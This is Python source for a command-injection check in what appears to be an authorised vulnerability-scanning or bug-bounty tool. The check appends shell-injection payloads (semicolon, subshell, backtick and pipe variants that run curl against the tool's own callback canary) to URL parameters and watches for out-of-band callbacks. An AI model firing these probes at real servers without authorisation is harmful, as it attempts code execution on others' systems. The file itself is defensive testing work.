from __future__ import annotations

from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from .. import Ctx, register, register_repro

PARAM_CAP = 3          # params tested per program/night
PROBES_PER_PARAM = 2   # syntax families tried per param


def _payloads(http_canary: str) -> list[tuple[str, str]]:
    """Command-INJECTION proof without destruction: the injected command is
    only a fetch to OUR OAST canary. Server executes => callback => RCE
    proven out-of-band. Variants cover the common separators; the shell
    never touches target data. NOTE: the payload text itself is what the
    triager needs — harmless by construction."""
    q = http_canary
    return [
        ("semicolon_curl", f"; curl '{q}'"),
        ("subshell_curl", f"$(curl '{q}')"),
        ("backtick_curl", f"`curl '{q}'`"),
        ("pipe_curl", f"| curl '{q}'"),
    ]


@register("cmd_inject", "WSTG-INPV-12", "high")
def check_cmd_inject(ctx: Ctx) -> list[dict]:
    """Grant 'deep' + OAST required (same trust model as blind_oast). LLM
    can NEVER trigger this — only the grant flow. Signal on callback only:
    a probe with no egress produces zero noise, zero trace beyond the
    failed argument itself."""
    oast = getattr(ctx, "oast", None)
    if oast is None or ctx.fetch is None or not getattr(ctx, "params", None):
        return []
    out = []
    for url, param, orig in ctx.params[:PARAM_CAP]:
        parsed = urlparse(url)
        token = oast.new_token(url)
        canary = oast.http_canary(token)
        fired = None
        for kind, payload in _payloads(canary)[:PROBES_PER_PARAM * 2]:
            q = {k: v[0] for k, v in parse_qs(parsed.query).items() if v}
            q[param] = (orig or "") + payload
            probe = urlunparse(parsed._replace(query=urlencode(q)))
            try:
                ctx.fetch(probe)
            except Exception:
                break
            cb = oast.poll(token, timeout_s=8)
            if cb:
                fired = (probe, kind, cb[0])
                break
        if fired:
            out.append({"check_id": "cmd_inject", "asset": fired[0],
                        "severity_hint": "critical",
                        "payload": {"param": param, "syntax": fired[1],
                                    "redacted_proof": str(fired[2])[:160]}})
    return out


register_repro("cmd_inject", lambda sig: [
    f"The parameter {sig['payload']['param']!r} on {sig['asset'].split('?')[0]}"
    " is passed to a shell without sanitization: the (injected) command "
    "performs an outbound fetch to a research-controlled canary — capture "
    "attached proves the server itself executed it.",
    "Payload is deliberately inert (one HTTP GET to our canary). Full "
    "interactive-execution escalation deliberately NOT performed per scope "
    "rules; impact statement assumes arbitrary command execution.",
])
